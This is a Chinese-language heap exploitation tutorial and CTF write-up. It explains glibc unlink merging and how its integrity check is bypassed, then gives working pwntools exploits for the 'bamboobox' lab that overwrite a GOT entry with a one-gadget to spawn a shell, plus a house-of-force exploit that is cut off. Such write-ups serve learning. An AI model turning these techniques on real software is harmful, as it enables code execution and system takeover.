这是我开始学习堆不久后对于一些知识点和CTF题型的总结，希望能帮助到更多的初学者入门二进制安全，大家可以一起打PWN交流，题目和exp我放在附件，下面直接进入正题：
### 一、源码介绍：
#### 当需要合并相邻的freechunk时用到unlink：
1、向后合并：
    #!c
        /*malloc.c  int_free函数中*/
    /*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/
    /* consolidate backward */
        if (!prev_inuse(p)) {
          prevsize = p->prev_size;
    size += prevsize;
    //修改指向当前chunk的指针，指向前一个chunk。
          p = chunk_at_offset(p, -((long) prevsize)); 
          unlink(p, bck, fwd);
    }   
    //相关函数说明：
    /* Treat space at ptr + offset as a chunk */
    #define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) 
    /*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
    #define unlink(P, BK, FD) {                                            \
        FD = P->fd;                                   \
        BK = P->bk;                                   \
        FD->bk = BK;                                  \
        BK->fd = FD;                                  \
        ...
    }
画个图举例说明：  
当chunk2free完了，发现上一个块chunk1也是free状态的，就抱大腿合并起来，指挥权交给chunk1，指向chunk2的ptr指针现在指向chunk1，size也变为size+presize：也就是这样：
接着因为使用完了会进行分箱式管理，因此这个新的free的chunk1不会很快回到操作系统，于是需要从所在的free的chunk链中进行unlink（有fd指针和bk指针）再放到unsorted
bin中保存。
2、向前合并（）：
    #!c
    ……
    /*这里p指向当前chunk*/
    nextchunk = chunk_at_offset(p, size);
    ……
    nextsize = chunksize(nextchunk);
    ……
    if (nextchunk != av->top) { 
          /* get and clear inuse bit */
          nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk
          /* consolidate forward */
          if (!nextinuse) { //next chunk为free chunk
                unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除
              size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
          } else
                clear_inuse_bit_at_offset(nextchunk, 0);    
          ……
        }
同样用图来解释：
当chunk1free完了，发现相邻的chunk2也是free的，会先进行unlink(让chunk2先脱链，有fd和bk指针)，然后再进行合并：size
= size+nextsize，ptr指向不变，还是自己：
以上就是两种合并free的chunk的方式，合并过程中用到unlink函数，在free的链表中把chunk块脱下来，然后可以把新的free的chunk块放到bins中管理~
### 二、保护机制探索
目前集成的对于unlink的保护机制主要就是下面这个：
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
这个保护学过了数据结构都懂得，也就是要满足p-->fd-->bk = p-->bk-->fd = p，很好理解，但是要怎么绕过呢？
利用一个很巧妙的数学等式，完美搞定：下面的例子演示的是64位的例子（一个字节8位），取一个全局变量ptr（指针地址，一般为chunk块的指针地址，存放于bss段中）
令p-->fd = ptr - 24，p-->bk = ptr - 16 ，为什么这么构造，待会就知道了，我们知道空闲块的布局是这样的：
当我们构造好了后，得到FD = p-->fd = ptr - 24，BK = p-->bk = ptr - 16，那么FD-->bk = FD + 3*8
= ptr - 24 + 24 = ptr，同理可得BK-->fd = BK + 16 = ptr - 16 + 16 = ptr,也就是说FD-->bk
= BK-->fd = ptr，从而成功绕过了检测机制，那么unlink执行了~我们知道执行是这样的：
    FD = P->fd;                                   \
        BK = P->bk;                                   \
        FD->bk = BK;                                  \
        BK->fd = FD;
根据上面的精心构造，我们可以得到FD-->bk = BK 相当于ptr = ptr - 16，BK->fd = FD相当于 ptr = ptr -24，unlink执行完了后，我们得到最终的结果就是ptr = ptr -24
，也就是说ptr指向了ptr-24的地址处。那么如果我们往ptr写入内容为‘a’*24+free(got)，那么就可以实现在ptr处写入free的got表，如果再往ptr写入onegadget，那么就是我往free的got表写入onegadget从而getshell~
纸上学终觉浅，绝知此事要躬行：上题目
### LAB11:bamboobox
开了堆栈不可执行和栈溢出保护，问题不大：
ida分析一波
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      _QWORD *v3; // [rsp+8h] [rbp-18h]
      char buf; // [rsp+10h] [rbp-10h]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stdin, 0LL, 2, 0LL);
      v3 = malloc(0x10uLL);
      *v3 = hello_message;
      v3[1] = goodbye_message;
      (*v3)(16LL, 0LL);
      while ( 1 )
      {
        menu();
        read(0, &buf, 8uLL);
        switch ( atoi(&buf) )
        {
          case 1:
            show_item(&buf, &buf);
            break;
          case 2:
            add_item(&buf, &buf);
            break;
          case 3:
            change_item();
            break;
          case 4:
            remove_item();
            break;
          case 5:
            (v3[1])(&buf, &buf);
            exit(0);
            return;
          default:
            puts("invaild choice!!!");
            break;
        }
      }
    }
熟悉的菜单题：把功能都看一遍
接着我们把函数提取出来：
    def malloc(size,content):
        ru("Your choice:")
        sl('2')
        ru("Please enter the length of item name:")
        sd(str(size))
        ru("Please enter the name of item:")
        sd(content)
    def free(index):
        ru("Your choice:")
        sl('4')
        ru("Please enter the index of item:")
        sl(str(index))
    def exit():
        ru("Your choice:")
        sl('5')
    def puts():
        ru("Your choice:")
        sl('1')
    def change(index,size,content):
        ru("Your choice:")
        sl('3')
        ru("Please enter the index of item:")
        sd(str(index))
        ru("Please enter the length of item name:")
        sd(str(size))
        ru("Please enter the new name of the item:")
        sd(content)
认真分析会发现chunk块的结构如下:
struct chunk{
int size；
char a[size];
}
进一步分析可以知道，存在堆溢出的漏洞，造成堆块的重叠，这里就是说change时会把新的内容输进去，从而覆盖原来的内容达到溢出的目的，但是一开始题目会生成一个chunk（0x10），我们知道这是用于输出最开始和结束的字符串，有地址，程序有magic地址：
这题的思路就是unlink，因为有堆溢出的漏洞，所以可以改写相邻的chunk的状态，使得它在free时会触发unlink，实现我们的攻击目的：
利用思路：在chunk1中构造fake_chunk，然后溢出改chunk2的presize和size，这样就可以free掉chunk1了，同时可以触发unlink，使得我们的ptr指针指向ptr-3的位置，输入时输入‘a’*24+atoi_got，就可以实现ptr指向got表，接着可打印出真实地址，又可以改写got为onagadget。
上exp:
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./bamboobox')
    if local:
        p = process('./bamboobox')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('./libc.so.6')
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def malloc(size,content):
        ru("Your choice:")
        sl('2')
        ru("Please enter the length of item name:")
        sd(str(size))
        ru("Please enter the name of item:")
        sd(content)
    def free(index):
        ru("Your choice:")
        sl('4')
        ru("Please enter the index of item:")
        sl(str(index))
    def exit():
        ru("Your choice:")
        sl('5')
    def puts():
        ru("Your choice:")
        sl('1')
    def change(index,size,content):
        ru("Your choice:")
        sl('3')
        ru("Please enter the index of item:")
        sd(str(index))
        ru("Please enter the length of item name:")
        sd(str(size))
        ru("Please enter the new name of the item:")
        sd(content)
    magic = 0x400d49
    atoi_got = elf.got["atoi"]
    #bk(0x0000000000400ADD)
    malloc(0x80,'aaaa')
    malloc(0x80,'bbbb')
    FD = 0x6020c8 - 3*8
    BK = FD + 8
    py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK)  #0x20
    py1 += "a"*0x60 
    py1 += p64(0x80) + p64(0x90) #0x10
    change(0,0x90,py1)
    free(1)
    py2 = ''
    py2 += 'a'*24 + p64(atoi_got)
    change(0,len(py2),py2) 
    puts()
    atoi_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
    print "atoi_addr--->" + hex(atoi_addr)
    onegadget = atoi_addr - libc.symbols["atoi"] + 0xf02a4
    print "onegadget--->" + hex(onegadget)
    change(0,0x10,p64(onegadget))
    exit()
    p.interactive()
下面进入gdb动态调试一波，看下具体是怎么实现的：
首先是malloc两个0x80大小的块（实际会是0x90，超过了fastbin的范围），就可以实现unlink，双向链表才有这个操作，fastbin单向链表所以是没有的unlink的攻击的。
可以看到3个chunk，1号chunk是存字符串的，2和3号chunk是我们申请的chunk块。
接着我们构造出fake_chunk:
在free掉chunk3前，我们先看看我们的ptr = 0x6020c8在内存中的布局：
看到它指向的正是0xf4d030，也就是我们的chunk2的string的堆块地址，接着我们free掉chunk3，可以得到：
ptr指向我们的ptr-24的位置（0x6020b0），接着看下我们的堆块
可以看到由于只有一个free块又与topchunk相邻，所以会和topchunk结合。大小变成0x20fd1，如果申请了3个chunk就会放到unsorted
bin 中。
接着我们改写0x6020c8的位置为atoi的got表：
这里前面有3个位置直接填充字符，看到0x6020c8的位置被我们成功写成了atoi的got表，接着再写一次就是往got写onegadget了：
可以看到成功写入了onegadget，当再次选择时，调用atoi函数就是调用了onegadget，那么就可以gethell了~
这题如果不用unlink去做，就是用house of
force，也就是一开始我想的，怎么修改程序自己生成的那个chunk，因为里面有地址，想要修改地址里面的内容为我们的magic，这样就可以实现catflag了，直接上exp:
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./bamboobox')
    if local:
        p = process('./bamboobox')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('./libc.so.6')
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def malloc(size,content):
        ru("Your choice:")
        sl('2')
        ru("Please enter the length of item name:")
        sd(str(size))
        ru("Please enter the name of item:")
        sd(content)
    def free(index):
        ru("Your choice:")
        sl('4')
        ru("Please enter the index of item:")
        sl(str(index))
    def exit():
        ru("Your choice:")
        sl('5')
    def puts():
        ru("Your choice:")
        sl('1')
    def change(index,size,content):
        ru("Your choice:")
        sl('3')
        ru("Please enter the index of item:")
        sd(str(index))
        ru("Please enter the length of item name:")
        sd(str(size))
        ru("Please enter the new name of the item:")
        sd(content)
    magic = 0x400d49
    bk(0x0000000000400ADD)
    malloc(0x60,'aaaa')
    py1 = 'a'*0x60 + p64(0) + p64(0xffffffffffffffff)
    change(0,0x70,py1)
    malloc(-160,'bbbb')